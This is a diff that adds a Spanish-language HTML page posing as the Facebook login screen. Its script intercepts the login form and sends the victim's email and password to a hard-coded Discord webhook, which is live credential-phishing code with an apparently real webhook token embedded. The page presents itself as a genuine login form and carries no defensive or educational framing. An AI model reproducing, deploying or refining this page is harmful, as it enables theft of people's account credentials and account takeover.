@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Iniciar sesión | Facebook</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .form-container {
+      background-color: #fff;
+      padding: 40px;
+      border-radius: 8px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      width: 400px;
+      text-align: center;
+    }
+
+    .form-container h2 {
+      font-size: 24px;
+      color: #1877f2;
+      margin-bottom: 20px;
+    }
+
+    .form-container input {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+      font-size: 14px;
+    }
+
+    .form-container input[type="submit"] {
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      cursor: pointer;
+      font-weight: bold;
+      transition: background-color 0.3s;
+    }
+
+    .form-container input[type="submit"]:hover {
+      background-color: #165eab;
+    }
+
+    .form-container .forgot-password {
+      text-align: left;
+      font-size: 12px;
+      color: #1877f2;
+      cursor: pointer;
+    }
+
+    .form-container .create-account {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #1877f2;
+    }
+
+    .form-container .create-account a {
+      text-decoration: none;
+      color: #1877f2;
+    }
+
+    .form-container .create-account a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="form-container">
+    <h2>Facebook</h2>
+    <form id="login-form">
+      <input type="email" id="email" name="email" placeholder="Correo electrónico o teléfono" required>
+      <input type="password" id="password" name="password" placeholder="Contraseña" required>
+      <input type="submit" value="Iniciar sesión">
+    </form>
+    <div class="forgot-password">
+      <a href="#">¿Olvidaste la contraseña?</a>
+    </div>
+    <div class="create-account">
+      <p>¿No tienes cuenta? <a href="#">Crea una cuenta</a></p>
+    </div>
+  </div>
+
+  <script>
+    // Webhook URL de Discord (Reemplaza con tu URL del Webhook)
+    const discordWebhookUrl = "https://discord.com/api/webhooks/1329598562451062805/J2HaJApGrb1wjKUZCBny7zlU2OErOia3o1q-BCsmK3wpAqQv6Nu5C4KReSHwXCHlOcHu";
+
+    // Obtener el formulario
+    const form = document.getElementById("login-form");
+
+    // Evento cuando se envíe el formulario
+    form.addEventListener("submit", function(e) {
+      e.preventDefault(); // Evitar el envío del formulario por defecto
+
+      // Obtener los valores del formulario
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+
+      // Preparar el mensaje para enviar a Discord
+      const message = {
+        content: `Nuevo inicio de sesión:\nCorreo: ${email}\nContraseña: ${password}`
+      };
+
+      // Enviar los datos al Webhook de Discord
+      fetch(discordWebhookUrl, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(message)
+      })
+      .then(response => response.json())
+      .then(data => {
+        alert("Formulario enviado correctamente.");
+      })
+      .catch(error => {
+        alert("Hubo un error al enviar el formulario.");
+        console.error(error);
+      });
+    });
+  </script>
+
+</body>
+</html>
